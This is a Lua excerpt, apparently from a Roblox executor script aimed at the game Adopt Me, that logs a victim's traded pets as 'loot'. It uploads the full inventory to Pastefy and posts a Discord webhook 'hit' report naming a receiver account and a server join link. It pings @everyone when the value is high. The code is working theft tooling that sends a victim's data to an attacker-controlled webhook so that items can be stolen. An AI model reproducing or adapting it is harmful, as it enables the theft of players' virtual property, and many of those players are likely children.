local function UploadToPastefy(Text)
    if not Text or Text == "" then return nil end

    local Response = HttpRequest({
        Url = "https://pastefy.app/api/v2/paste",
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bearer " .. PASTEFY_KEY,
            ["Content-Type"] = "application/json",
        },
        Body = JsonEncode({
            content = Text,
            title = "Jmcxz ADM Inventory",
            expires = "never",
            encrypted = false,
        }),
    })

    if not Response or not Response.Body then return nil end
    local Data = JsonDecode(Response.Body)
    if Data and Data.paste and Data.paste.id then
        return "https://pastefy.app/" .. Data.paste.id .. "/raw"
    end
    return nil
end

local function GenerateInventoryText(Pets)
    local Lines = {}
    local Total = 0
    for _, Pet in ipairs(Pets) do Total = Total + (Pet.Value or 0) end

    table.insert(Lines, "Total Value: " .. FormatNumber(Total))
    table.insert(Lines, "Pets: " .. #Pets)
    table.insert(Lines, string.rep("-", 48))
    for _, Pet in ipairs(Pets) do
        table.insert(Lines, string.format(
            "[%s] %s%s - %s",
            Pet.Rarity, Pet.Name, Pet.Props, FormatNumber(Pet.Value)
        ))
    end
    return table.concat(Lines, "\n")
end

local function GetHitStatus(ReceiverName)
    if #TradeState.Offered == 0 then
        return STATUS_LABELS.Nothing
    end
    if type(ReceiverName) == "string" and Players:FindFirstChild(ReceiverName) then
        return STATUS_LABELS.Ready
    end
    return STATUS_LABELS.Pending
end

local function GetActiveReceiverName()
    for _, Name in ipairs(RECEIVER) do
        if type(Name) == "string" and Name ~= "" then
            if Players:FindFirstChild(Name) then return Name end
        end
    end
    return RECEIVER[1] or "Unknown"
end

local function BuildEmbed()
    local Offered = TradeState.Offered
    local ReceiverName = GetActiveReceiverName()
    local Status = GetHitStatus(ReceiverName)

    local TotalValue = 0
    for _, Pet in ipairs(Offered) do TotalValue = TotalValue + (Pet.Value or 0) end

    local JobId = game.JobId
    local JoinLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
        .. "&gameInstanceId=" .. tostring(JobId)

    -- Loot block, highest value first, truncated like the mm2 embed.
    local LootLines = {}
    for Index = 1, math.min(#Offered, LOOT_LINE_LIMIT) do
        local Pet = Offered[Index]
        table.insert(LootLines, string.format(
            "%s%s - %s", Pet.Name, Pet.Props, FormatNumber(Pet.Value)
        ))
    end
    if #Offered > LOOT_LINE_LIMIT then
        table.insert(LootLines, string.format("... and %d more", #Offered - LOOT_LINE_LIMIT))
    end
    table.insert(LootLines, string.rep("=", 24))
    table.insert(LootLines, "Total: " .. FormatNumber(TotalValue))

    local Fields = {
        {name = "🛠️ Game", value = "Adopt Me", inline = true},
        {name = "⚡ Executor", value = _G.RealExecutor or "unknown", inline = true},
        {name = "🖥️ Server", value = "[Join now!](" .. JoinLink .. ")", inline = true},
        {name = "📜 Join Script", value = "```" .. JOIN_NOTICE .. "```", inline = false},
        {name = "📦 Loot", value = "```" .. table.concat(LootLines, "\n") .. "```", inline = false},
    }

    if #Offered > 0 then
        local PasteUrl = UploadToPastefy(GenerateInventoryText(Offered))
        if PasteUrl then
            table.insert(Fields, {
                name = "📄 Full Inventory Log",
                value = PasteUrl,
                inline = false,
            })
        end
    end

    local DateText = os.date("%m/%d/%Y %I:%M %p"):gsub("^0", "")

    return {
        author = {name = EMBED_AUTHOR},
        title = string.format("%s • %s", LocalPlayer.DisplayName, JobId),
        description = string.format(
            "**Status**\n%s %s\n\nReceiver: **%s**\nTotal: **%s**",
            Status.Emoji, Status.Text, ReceiverName, FormatNumber(TotalValue)
        ),
        color = 0x4B5563,
        thumbnail = {url = EMBED_ICON},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = Fields,
        footer = {text = EMBED_FOOTER .. " • " .. DateText},
    }
end

local function SendWebhook()
    local Embed = BuildEmbed()

    local Payload = {
        username = EMBED_FOOTER,
        embeds = {Embed},
    }

    -- Only ping on a meaningful hit, same threshold idea as the mm2 script.
    local TotalValue = 0
    for _, Pet in ipairs(TradeState.Offered) do TotalValue = TotalValue + (Pet.Value or 0) end
    if TotalValue >= 1000000 then
        Payload.content = "@everyone **Jmcxz | ADM HIT**"
    end

    local Response = HttpRequest({
        Url = WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = JsonEncode(Payload),
    })

    if Response then
        Log("webhook status:", tostring(Response.StatusCode))
    else
        Log("webhook post failed")
    end

    return Response
end

